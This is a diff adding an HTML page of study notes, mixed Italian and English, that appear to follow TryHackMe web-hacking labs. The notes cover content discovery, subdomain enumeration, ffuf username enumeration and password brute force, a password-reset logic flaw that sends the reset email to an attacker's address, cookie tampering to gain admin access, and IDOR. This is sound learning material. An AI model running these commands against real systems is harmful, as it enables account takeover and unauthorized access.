@@ -1,0 +1,293 @@
+<!DOCTYPE HTML>
+<html lang="it">
+<head>
+<meta charset="UTF-8">
+<title>Web App analysis</title>
+<meta name="description" content="Web App analysis">
+    <meta name="author" content="Massimo">
+    <link rel="stylesheet" href="Styles/Styles.css">
+</head>
+<body>
+    <!-- Dashboard iframe -->
+<div class="dashboard">
+    <iframe src="dashboardSOC.html" title="dashboardSOC"></iframe>
+</div>
+<!-- Header titolo -->
+<header>
+    <div class="line"></div>
+    <h3>Web App analysis - Parte 1</h3>
+</header>
+
+<div class="flex-container">
+    
+        <div id="inizio" class="tools-container">
+        <a href="#inbuilt"  class="button-link">The in-built browser tools</a>
+        <a href="#Content"  class="button-link">Content Discovery</a> 
+        <a href="#robot"  class="button-link">Manual Discovery - Robots.txt</a>  
+        <a href="#favicon"  class="button-link">Manual Discovery - Favicon</a>
+        <a href="#sitemap"  class="button-link">Manual Discovery - Sitemap.xml</a>
+        <a href="#headers"  class="button-link">Manual Discovery - HTTP Headers</a>
+        <a href="#framework"  class="button-link">Manual Discovery - Framework Stack</a>
+        <a href="#osint"  class="button-link">Google Hacking / Dorking</a>
+        <a href="#osint2"  class="button-link">OSINT - Wappalyze</a>
+        <a href="#osint3"  class="button-link">OSINT - Wayback Machine</a>
+        <a href="#osint4"  class="button-link">OSINT - GitHub</a>
+        <a href="#osint5"  class="button-link">OSINT - S3 Buckets</a>
+        <a href="#auto"  class="button-link">Automated Discovery</a>_     
+        <a href="#enum"  class="button-link">Subdomain Enumeration</a>    
+        <a href="#ssl"  class="button-link">OSINT - SSL/TLS Certificates</a>   
+        <a href="#searchEng"  class="button-link">OSINT - Search Engines</a>  
+        <a href="#dns"  class="button-link">DNS Brute Force</a>  
+        <a href="#sub"  class="button-link">OSINT - Sublist3r</a>  
+        <a href="#virt"  class="button-link">Virtual Hosts ( FFUF )</a>_
+        <a href="#authbypass"  class="button-link">Authentication Bypass</a>  
+        <a href="#username"  class="button-link">Username Enumeration</a> 
+        <a href="#logic"  class="button-link">Logic Flaw</a> 
+        <a href="#cookie"  class="button-link">Cookie Tampering</a> 
+        <a href="#hashing"  class="button-link">Hashing</a> 
+        <a href="#IDOR"  class="button-link">Insecure Direct Object Reference</a>             
+        </div>
+<div class="sub-container">    
+    <h2 id="inbuilt">The in-built browser tools</h2> 
+    <p>Su browser tipo Google Chrome, Mozilla Firefox, ecc, è possibile accedere tramite click destro su mouse o opzioni vari strumenti di analisi.</p>   
+    <ul>
+        <li><i>View Source</i> - Use your browser to view the human-readable source code of a website.</li>
+        <li><i>Inspector</i> - Learn how to inspect page elements and make changes to view usually blocked content.</li>
+        <li><i>Debugger</i> - Inspect and control the flow of a page's JavaScript</li>
+        <li><i>Network</i> - See all the network requests a page makes.</li>
+    </ul>
+    <p><b>1) Exploring The Website : </b>Finding interactive portions of the website can be as easy as spotting a login form to manually reviewing the website's JavaScript. An excellent place to start is just with your browser exploring the website and noting down the individual pages/areas/features with a summary for each one.</p>
+    <p><b>2) Viewing Page</b></p>
+    <p><b>3) Developer Tools :</b><br>
+    <i>Inspector</i><br>
+    <i>Debugger: </i>This panel in the developer tools is intended for debugging JavaScript, and again is an excellent feature for web developers wanting to work out why something might not be working. But as penetration testers, it gives us the option of digging deep into the JavaScript code. In Firefox and Safari, this feature is called Debugger, but in Google Chrome, it's called Sources. <br>
+    <i>Network: </i>The network tab on the developer tools can be used to keep track of every external request a webpage makes.<br>
+    With the network tab open, try filling in the contact form and pressing the Send Message button. You'll notice an event in the network tab, and this is the form being submitted in the background using a method called AJAX. AJAX is a method for sending and receiving network data in a web application background without interfering by changing the current web page.<br>
+    In form contact, se si inseriscono i dati, questi compaiono su network, la cui possiamo verificare varie etichette, <i>headers, requests, response</i><br>
+    <i>-----> (praticamente si fruga dentro il sito, leggendo i commenti, scovando directory e digitandoli insieme all'indirizzo)</i><br>
+    <i>----> (con inspector, certe pagine dove vengono "oscurate" per utenti premium, possiamo in realtà leggere cosa c'e scritto in html o quali immagini ci sono)</i><br>
+    <i>---> (Developer Tools - Debugger, selezionando l'intera riga di un file .js, è possibile porzione dopo porzione trovare eventuali problemi / errori / segreti nel caso di THM)</i><br> </p>    
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="Content">Content Discovery</h2>
+    <p>There are three main ways of discovering content on a website which we'll cover. <i>Manually, Automated and OSINT (Open-Source Intelligence)</i>.</p>
+    <h3 id="robot">Manual Discovery - Robots.txt</h3>
+    <p>The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren't displayed in search engine results. These pages may be areas such as administration portals or files meant for the website's customers. This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.</p>
+    <h3 id="favicon">Manual Discovery - Favicon</h3>
+    <p>Sometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover, and if the website developer doesn't replace this with a custom one, this can give us a clue on what framework is in use. OWASP host a database of common framework icons that you can use to check against the targets favicon <b>https://wiki.owasp.org/index.php/OWASP_favicon_database</b>. Once we know the framework stack, we can use external resources to discover more about it (see next section).
+    <br>Esempio:<br>
+    <code>
+        curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum <br>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>
+                                 Dload  Upload   Total   Spent    Left  Speed<br>
+100  1406  100  1406    0     0  37000      0 --:--:-- --:--:-- --:--:-- 37000<br>
+f276b19aabcb4ae8cda4d22625c6735f  -<br>
+    </code>
+It will download the favicon and get its md5 hash value which you can then lookup on the https://wiki.owasp.org/index.php/OWASP_favicon_database.
+</p>
+<h3 id="sitemap">Manual Discovery - Sitemap.xml</h3>
+<p>Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.
+<br>
+<i>Esempio con curl:</i><code>curl http://10.81.183.85/sitemap.xml</code>
+</p>
+<h3 id="headers">Manual Discovery - HTTP Headers</h3>
+<p>When we make requests to the web server, the server returns various HTTP headers. These headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use. 
+Using this information, we could find vulnerable versions of software being used.
+<br><code>curl http://10.81.183.85 -v </code>   (the -v switch enables verbose mode, which will output the headers )
+</p>
+<h3 id="framework">Manual Discovery - Framework Stack</h3>
+<p>Once you've established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework's website. From there, we can learn more about the software and other information, possibly leading to more content we can discover.</p>
+<p><i>(nell'esercizio, dal framework ottengo user, password e il path thm-framework-login, da inserire dopo l'indirizzo web)</i></p>
+<h3 id="osint">OSINT - Google Hacking / Dorking</h3>
+<p>There are also external resources available that can help in discovering information about your target website; these resources are often referred to as OSINT or (Open-Source Intelligence) as they're freely available tools that collect information.</p>
+<p><b>Google hacking / Dorking</b> utilizes Google's advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out results from a certain domain name using the site: filter, for example (site:tryhackme.com) you can then match this up with certain search terms, say, for example, the word admin (site:tryhackme.com admin) this then would only return results from the tryhackme.com website which contain the word admin in its content. You can combine multiple filters as well. Here is an example of more filters you can use:
+<br><i>Filter + Example + Description</i><br>
+site - <code>site:tryhackme.com</code> - returns results only from the specified website address<br>
+inurl - <code>inurl:admin</code> - returns results that have the specified word in the URL<br>
+filetype - <code>filetype:pdf</code> -	returns results which are a particular file extension<br>
+intitle	- <code>intitle:admin</code> - returns results that contain the specified word in the title<br>
+<a href="https://en.wikipedia.org/wiki/Google_hacking " target="_blank" title="google">More information about google hacking can be found here</a></p>
+<h3 id="osint2">OSINT - Wappalyzer</h3>
+<p><a href="https://www.wappalyzer.com/" target="_blank"  title="wappalyzer">Wappalyzer</a> is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.</p>
+<h3 id="osint3">OSINT - Wayback Machine</h3>
+<p><a href="https://archive.org/web/" target="_blank"  title="archive">The Wayback Machine</a> is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.</p>
+<h3 id="osint4">OSINT - GitHub</h3>
+<p>To understand GitHub, you first need to understand Git. Git is a version control system that tracks changes to files in a project. Working in a team is easier because you can see what each team member is editing and what changes they made to files. When users have finished making their changes, they commit them with a message and then push them back to a central location (repository) for the other users to then pull those changes to their local machines. GitHub is a hosted version of Git on the internet. Repositories can either be set to public or private and have various access controls. You can use GitHub's search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn't yet found.</p>
+<h3 id="osint5">OSINT - S3 Buckets</h3>
+<p>S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazonaws.com where {name} is decided by the owner, such as tryhackme-assets.s3.amazonaws.com. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as {name}-assets, {name}-www, {name}-public, {name}-private, etc.
+</p>
+<h3 id="auto">Automated Discovery</h3>
+<p><b>What is Automated Discovery?</b> Automated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn't previously know existed. This process is made possible by using a resource called wordlists.<br>
+<b>What are wordlists?</b> Wordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the most frequently used passwords, whereas we're looking for content in our case, so we'd require a list containing the most commonly used directory and file names. An excellent resource for wordlists that is preinstalled on the THM AttackBox is https://github.com/danielmiessler/SecLists which Daniel Miessler curates.<br>
+<b>Automation Tools: </b> Although there are many different content discovery tools available, all with their features and flaws, we're going to cover three which are preinstalled on our attack box, <code>ffuf, dirb and gobuster.</code><br>
+<code>
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ<br>
+dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt<br>
+gobuster dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt<br>
+</code>
+<b>!!! Da inserire appunti Gobuster!!!</b>
+</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="enum">Subdomain Enumeration</h2>
+    <p>Subdomain enumeration is the process of finding valid subdomains for a domain.
+We will explore three different subdomain enumeration methods:<i> Brute Force, OSINT (Open-Source Intelligence) and Virtual Host.</i></p>
+    <h3 id="ssl">OSINT - SSL/TLS Certificates</h3>
+    <p>When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like <a href="https://crt.sh/" target="_blank"  title="dbcert"> https://crt.sh</a> offer a searchable database of certificates that shows current and historical results.</p>    
+    <h3 id="searchEng">OSINT - Search Engines</h3>
+    <p>Using advanced search methods on websites like Google, such as the site: filter, can narrow the search results. For example, <code>site:*.domain.com -site:www.domain.com</code> would only contain results leading to the domain name domain.com but exclude any links to www.domain.com; therefore, it shows us only subdomain names belonging to domain.com.
+Go to Google and use the search term site:<code>*.tryhackme.com -site:www.tryhackme.com</code>, which should reveal a subdomain for tryhackme.com; use that subdomain to answer the question below.
+</p>
+    <h3 id="dns">DNS Brute Force</h3>
+    <p>Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker.</p>
+    <p>      
+L'esempio usa <code>dnsrecon -t brt -d acmesupport.thm   </code><br>
+Esegue un'analisi DNS per identificare i record DNS di tipo 'brute force' per il dominio 'acmesupport.thm'. Questo tipo di scansione tenta di trovare subdomini tramite una lista di parole predefinita. È utile per scoprire informazioni non visibili facilmente.<br>
+Le opzioni di <i>'dnsrecon'</i> includono vari parametri. <b>'-t'</b> specifica il tipo di scansione (come <b>brt</b> per brute force), mentre <b>'-d'</b> indica il dominio su cui eseguire la scansione. Ci sono anche altre opzioni per gestire i dettagli della scansione, come <b>'-h'</b> per l'aiuto e <b>'-s'</b> per specificare un file di lista di subdomini.<br>
+<i>Differenze tra Gobuster e dnsrecon:</i> <b>Gobuster</b> è uno strumento per il brute forcing di URL e directory, utile per scoprire file e percorsi nascosti su un server web. Rispetto a <b>dnsrecon</b>, che si concentra sull'analisi DNS, <b>Gobuster</b> è più orientato verso la scansione delle risorse web una volta ottenuto un dominio.<br>
+Puoi usare <b>dnsrecon</b> quando hai bisogno di raccogliere informazioni sui record DNS di un dominio, in particolare per scoprire subdomini attraverso tecniche di brute force. È utile in fasi di OSINT per ottenere una panoramica completa della superficie di attacco di un dominio, specialmente se stai cercando di identificare punti deboli o risorse non documentate.</p>
+    <h3 id="sub">OSINT - Sublist3r</h3>
+    <p>To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like Sublist3r, ( è un app in .py)   https://www.kali.org/tools/sublist3r/ <br>
+<i>Esempio:</i><code>./sublist3r.py -d acmeitsupport.thm</code>
+</p>
+<h3 id="virt">Virtual Hosts</h3>
+<p>Some subdomains aren't always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their <i> /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users)</i>, which maps domain names to IP addresses. <br>
+Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilize this host header by making changes to it and monitoring the response to see if we've discovered a new website.
+</p>
+<p>1) <code>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.81.190.9</code><br>
+The above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds/edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.<br><br>
+2) Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value from the previous result<br>
+<code>ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.81.190.9 -fs {size}</code><br>
+This command has a similar syntax to the first apart from the -fs switch, which tells ffuf to ignore any results that are of the specified size.
+</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>  
+    <h2 id="authbypass">Authentication Bypass</h2>
+    <p>Esistono diversi metodi che possono bypassare, sconfiggere il sistema di autenticazione. Queste vulnerabilità possono portare a una fuga di dati personali.</p>
+    <h3 id="username">Username Enumeration</h3>
+    <p>A helpful exercise to complete when trying to find authentication vulnerabilities is creating <i>a list of valid usernames</i>, which we'll use later in other tasks.
+    <br>
+    <b>1)  Creating a list of valid usernames</b><br>
+    Website error messages are great resources for collating this information to build our list of valid usernames. <br>
+If you try entering the username admin and fill in the other form fields with fake information, you'll see we get the error An account with this username already exists. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.<br>
+    <b>2) </b><code> ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.81.177.104/customers/signup -mr "username already exists"</code><br>
+    In the above example, the <code>-w</code> argument selects the file's location on the computer that contains the list of usernames that we're going to check exists.<br>
+The <code>-X</code> argument specifies the request method, this will be a GET request by default, but it is a POST request in example (Form)<br>
+The <code>-d</code> argument specifies the data that we are going to send.<br>
+We've set the value of the username to FUZZ. In the ffuf tool, the <code>FUZZ</code> keyword signifies where the contents from our wordlist will be inserted in the request.<br>
+The <code>-H</code> argument is used for adding additional headers to the request.<br>
+In this instance, we're setting the <code>Content-Type</code> so the web server knows we are sending form data. <br>
+The <code>-u</code> argument specifies the URL we are making the request to<br>
+the <code>-mr</code> argument is the text on the page we are looking for to validate we've found a valid username.<br>
+<a href="https://github.com/ffuf/ffuf" target="_blank"  title="archive">Link FUFF</a><br>
+ 
+<i>***Questo sistema permette di vedere quali username sono validi/esistenti ***</i><br>
+Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a <b>brute force attack</b> on the login page
+     <br><b>3) A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames </b><br>
+     <code>ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.81.177.104/customers/login -fc 200</code><br>
+     <i>Previously we used the FUZZ keyword to select where in the request the data from the wordlists would be inserted, but because we're using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we've chosen <code>W1</code> for our list of valid usernames and <code>W2</code> for the list of passwords we will try. The multiple wordlists are again specified with the <code>-w</code> argument but separated with a comma.  For a positive match, we're using the <code>-fc</code> argument to check for an HTTP status code other than 200.</i>
+    </p>
+<h3 id="logic">Logic Flaw</h3>
+<p><b>What is a Logic Flaw? (errore logico)</b>Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance. </p>
+<p><b>Logic Flaw Example:</b> The below mock code example checks to see whether the start of the path the client is visiting begins with /admin and if so, then further checks are made to see whether the client is, in fact, an admin. If the page doesn't begin with /admin, the page is shown to the client.<br>
+<code>
+if( url.substr(0,6) === '/admin') {<br>
+    # Code to check user is an admin<br>
+} else {<br>
+    # View Page<br>
+}<br>
+</code>
+<i>Spiegazione Codice:</i> Il codice 'url.substr(0,6)' estrae i primi 6 caratteri dell'URL. Se questi caratteri corrispondono a '/admin', il sistema procede a verificare se l'utente è un amministratore. Questo può creare una falla logica poiché un URL come '/adMin' bypasserebbe il controllo degli accessi, permettendo a utenti non autorizzati di accedere alla pagina amministrativa.
+<br>
+<b>Note:</b> Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting /adMin will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.<br>
+</p>
+<p><b>Logic Flaw Practical</b><br>
+1)We're going to examine the Reset Password function.<br>
+2)We see a form asking for the email address associated with the account on which we wish to perform the password reset. If an invalid email is entered, you'll receive the error message "Account not found from supplied email address".<br>
+3)we'll use the email address robert@acmeitsupport.thm which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to robert@acmeitsupport.thm.<br>
+4)At this stage, you may be wondering what the vulnerability could be in this application as you have to know both the email and username and then the password link is sent to the email address of the account owner.<br>
+5)This walkthrough will require running both of the below Curl Requests<br>
+In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field.<br>
+<code>curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'</code><br>
+We use the <code>-H</code> flag to add an additional header to the request. In this instance, we are setting the <code>Content-Type</code> to application/x-www-form-urlencoded, which lets the web server know we are sending form data so it properly understands our request.<br>
+6)In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable $_REQUEST.<br>
+The PHP $_REQUEST variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.<br>
+<code>curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'</code><br>
+7)For the next step, you'll need to create an account on the Acme IT support customer section, doing so gives you a unique email address that can be used to create support tickets. The email address is in the format of {username}@customer.acmeitsupport.thm<br>
+<code>curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'</code><br>
+(nell'esercizio ho usato l'username di steve, perché conoscevo la password, da li ho ricevuto la mail di reset e ho raggiunto l'account di robert)
+</p>
+<h3 id="cookie">Cookie Tampering</h3>
+<p>Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.
+<br>Plain Text: The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:
+<br>
+<code>
+Set-Cookie: logged_in=true; Max-Age=3600; Path=/<br>
+Set-Cookie: admin=false; Max-Age=3600; Path=/<br>
+</code>
+We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.<br>
+<code>curl http://10.82.182.71/cookie-test</code> ---> We can see we are returned a message of: Not Logged In <br>
+Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:<br>
+<code>curl -H "Cookie: logged_in=true; admin=false" http://10.82.182.71/cookie-test</code> ---> We are given the message: Logged In As A User <br>
+Finally, we'll send one last request setting both the logged_in and admin cookie to true:
+<code>curl -H "Cookie: logged_in=true; admin=true" http://10.82.182.71/cookie-test</code>  ---> This returns the result: Logged In As An Admin<br>
+</p>
+<h3 id="hashing">Hashing</h3>
+<p>Sometimes cookie values can look like a long string of random characters; these are called hashes which are an <i>"irreversible"</i> representation of the original text. 
+<br><a href="https://crackstation.net" target="_blank" class="button-link1" title="CrackStation — hash cracking">Hash Cracker</a><br>
+<b>Encoding</b> is similar to hashing in that it creates what would seem to be a random string of text, but in fact, the encoding is <i>"reversible"</i>.
+Encoding allows us to convert binary data into human-readable text that can be easily and safely transmitted over mediums that only support plain text ASCII characters.
+Common encoding types are <b>base32</b> which converts binary data to the characters A-Z and 2-7, and <b>base64</b> which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.
+<br>Take the below data as an example which is set by the web server upon logging in:
+<br>
+<code>Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/</code><br>
+This string base64 decoded has the value of {"id":1,"admin": false} we can then encode this back to base64 encoded again but instead setting the admin value to true, which now gives us admin access.<br>
+Per fare decode base64:<br>
+<code> echo "U29tZSB0ZXN0" | base64 --decode </code>  oppure  <code> base64 -d input.txt > output.txt</code>
+</p>
+<h3 id="IDOR">IDOR</h3>
+<p>IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability.
+This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.
+<br><i>(Questo tipo di vulnerabilità può verificarsi quando un server web riceve input forniti dall'utente per recuperare oggetti (file, dati, documenti), è stata riposta troppa fiducia nei dati di input e non viene convalidato lato server per confermare che l'oggetto richiesto appartenga all'utente che lo richiede.)</i>
+<br>Example:</p>
+<ol>
+    <li>Imagine you've just signed up for an online service, and you want to change your profile information. The link you click on goes to http://online-service.thm/profile?user_id=1305, and you can see your information.</li>
+    <li>Curiosity gets the better of you, and you try changing the user_id value to 1000 instead (http://online-service.thm/profile?user_id=1000), and to your surprise, you can now see another user's information. You've now discovered an IDOR vulnerability! </li>
+</ol>
+<h3>Finding IDORs in Encoded IDs</h3>
+<p><b>Encoded IDs:</b> When passing data from page to page either by post data, query strings, or cookies, web developers will often first take the raw data and encode it. Encoding ensures that the receiving web server will be able to understand the contents. Encoding changes binary data into an ASCII string commonly using the a-z, A-Z, 0-9 and = character for padding. The most common encoding technique on the web is base64 encoding and can usually be pretty easy to spot.</p>
+<code>
+base64 decoded -> DECODE -> {"id":30} -> TAMPER -> {"id":10} -> ENCODE -> base64 encoded -> SUBMIT -> end <br>
+<i>(tamper = alterare)</i>
+</code>
+<h3>Finding IDORs in Hashed IDs</h3>
+<p>Hashed IDs are a little bit more complicated to deal with than encoded ones, but they may follow a predictable pattern, such as being the hashed version of the integer value. For example, the Id number 123 would become 202cb962ac59075b964b07152d234b70 if md5 hashing were in use.</p>
+<h3>Finding IDORs in Unpredictable IDs</h3>
+<p>If the Id cannot be detected using the above methods, an excellent method of IDOR detection is to create two accounts and swap the Id numbers between them. If you can view the other users' content using their Id number while still being logged in with a different account (or not logged in at all), you've found a valid IDOR vulnerability.</p>
+<h3>Where are IDORs located</h3>
+<p>The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file. 
+<br>
+Sometimes endpoints could have an unreferenced parameter that may have been of some use during development and got pushed to production. For example, you may notice a call to /user/details displaying your user information (authenticated through your session). But through an attack known as parameter mining, you discover a parameter called user_id that you can use to display other users' information, for example,<code> /user/details?user_id=123.</code>
+</p>
+<h3>A Practical IDOR Example</h3>
+<p>
+1)Firstly you'll need to log in. To do this, click on the customer's section and create an account. Once logged in, click on the Your Account tab. 
+<br><i>Invento un account</i><br>
+2)The Your Account section gives you the ability to change your information such as username, email address and password. You'll notice the username and email fields pre-filled in with your information.  
+<br><i>Sono sulla sezione dove vedo username e email già pre compilati, vado su inspect > network > faccio update su username e leggo le varie request</i><br>
+3)We'll start by investigating how this information gets pre-filled. If you open your browser developer tools, select the network tab and then refresh the page, you'll see a call to an endpoint with the path /api/v1/customer?id={user_id}.
+<br><i>Leggo nell'header di uno: GET https://10-82-154-97.reverse-proxy.cell-prod-eu-west-1c.vm.tryhackme.com/api/v1/customer?id=50</i><br>
+<i>su Response leggo in chiaro username e password</i><br><br>
+This page returns in JSON format your user id, username and email address. We can see from the path that the user information shown is taken from the query string's id parameter
+<br>
+4) You can try testing this id parameter for an IDOR vulnerability by changing the id to another user's id.
+<br><i>Facendo doppio click sulla prima finestra, visualizza il raw, dove possiamo modificare dalla barra di ricerca id</i><br>
+<i>( in questo caso ho messo id 1 e 3, come risultato ho ottenuto username e password)</i><br>
+<code>https://10-82-154-97.reverse-proxy.cell-prod-eu-west-1c.vm.tryhackme.com/api/v1/customer?id=1</code>
+</p>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+</div>
+
+</body>
+</html>
